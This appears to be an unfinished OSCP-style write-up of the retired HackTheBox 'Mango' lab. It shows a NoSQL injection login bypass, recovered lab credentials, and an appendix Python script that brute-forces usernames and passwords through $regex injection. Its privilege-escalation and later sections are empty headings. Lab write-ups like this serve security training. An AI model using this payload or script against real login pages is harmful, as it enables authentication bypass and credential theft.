# HTB Mango - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2026-3-25

---

## 0. Lesson Learned



---

## 1. Executive Summary

A full compromise of the Mango target system was achieved through exploitation of a NoSQL injection vulnerability in the web application. This allowed extraction of valid credentials, leading to SSH access. Privilege escalation was achieved via a misconfigured SUID binary (`jjs`), enabling arbitrary file writes as root and resulting in full system compromise.

---

## 2. Scope

- **Target:** 10.129.229.185
- **Environment:** HackTheBox Mongo (Retired Machine)
- **Testing Window:** 2026-3-24 to 2026-3-25
- **Objective:** Full system compromise

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Initial Access
- Post-Exploitation
- Privilege Escalation
- Proof of Compromise

---

## 4. Information Gathering

A full TCP-port scan was run with Nmap:

```
nmap -p- -sCV 10.129.229.185 -T4 -oA mango_tcp
```

Relevant open ports:

- 22/tcp - SSH - OpenSSH 7.6p1
- 80/tcp - HTTP - Apache 2.4.29
- 443/tcp - HTTP - Apache 2.4.29

Three services were identified: SSH, HTTP, and HTTPS. Web services were prioritized for further enumeration.

---

## 5. Enumeration

SSL Certificate Inspection revealed:

- Domain: staging-order.mango.htb
- Email: admin@mango.htb

A subdomain and email address were discovered, suggesting virtual hosting.

Domains were added to hosts file:

```
echo "10.129.229.185 mango.htb staging-order.mango.htb" >> /etc/hosts
```

Enabling proper resolution of discovered virtual hosts.

Login requests were intercepted and tested for NoSQL injectable parameters:

```
username[$ne]=admin&password[$ne]=admin
```

Successful bypass confirmed NoSQL injection vulnerability.

---

## 6. Initial Access

A custom python script taking advantage of NoSQL regex was used to brute force usernames and passwords.

```
python3 brute_user.py
```

Discovered credentials:

```
admin : t9KcS3>!0B#2

mango : h3mXK8RhU~f{]f5H
```

Two valid credential pairs were extracted.

SSH was accessed:

```
ssh mango@10.129.229.185
```

Resulting in successful authentication as user `mango`.

---

## 7. Post-Exploitation

---

## 8. Privilege Escalation

---

## 9. Proof of Compromise

---

## 10. Findings & Recommendations

---

## 11. Appendix

Python Script to Brute Force Usernames and Passwords in NoSQL (`brute_user.py`):

```
import requests
import string
import sys

def brute_password(user):
    password = ""
    while True:
        for c in string.ascii_letters + string.digits + string.punctuation:
            if c in ["*", "+", ".", "?", "|", "\\"]:
                continue
            sys.stdout.write(f"\r[+] Password: {password}{c}")
            sys.stdout.flush()
            resp = requests.post(
                "http://staging-order.mango.htb/",
                data={
                    "username": user,
                    "password[$regex]": f"^{password}{c}.*",
                    "login": "login",
                },
            )
            if "We just started farming!" in resp.text:
                password += c
                resp = requests.post(
                    "http://staging-order.mango.htb/",
                    data={"username": user, "password": password, "login": "login"},
                )
                if "We just started farming!" in resp.text:
                    print(f"\r[+] Found password for {user}: {password.ljust(20)}")
                    return
                break

def brute_user(res):
    found = False
    for c in string.ascii_letters + string.digits:
        sys.stdout.write(f"\r[*] Trying Username: {(res + c).ljust(20)}")
        sys.stdout.flush()
        resp = requests.post(
            "http://staging-order.mango.htb/",
            data={
                "username[$regex]": f"^{res}{c}.*",
                "password[$gt]": "",
                "login": "login",
            },
        )
        if "We just started farming!" in resp.text:
            found = True
            brute_user(res + c)
    if not found:
        print(f"\r[+] Found user: {res.ljust(20)}")
        brute_password(res)

brute_user("")
```